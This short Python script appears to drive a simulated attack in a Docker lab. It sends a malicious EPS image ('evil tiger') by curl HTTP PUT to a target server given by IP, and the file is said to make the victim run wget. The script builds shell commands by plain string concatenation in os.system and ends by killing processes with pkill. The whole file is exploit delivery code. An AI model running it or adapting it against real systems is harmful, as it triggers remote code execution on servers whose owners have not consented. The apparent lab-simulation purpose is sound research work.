import os
import argparse
import time


def send_file(file, victim):
    """
    sends the given file to the victim
    """
    print("sending: " + file + " to " + victim)
    os.system("curl -X PUT --upload-file " + file + " " + victim)


def exploit():
    """
    sends the malicious image_0501.eps (evil tiger) to the victim, this will execute a wget on the victim
    """
    evil = "/home/image_0501.eps"
    send_file(evil, target_url + ":" + target_port)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='HTTPS-Client Simulation.')

    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')
    args = parser.parse_args()

    # exploit settings
    target_port = "8000"
    target_url = args.server_ip

    exploit()

    # shutdown docker container by killing main process after exploit is finished
    print("exploit finished - shutting down")
    os.system("pkill -f sleep")


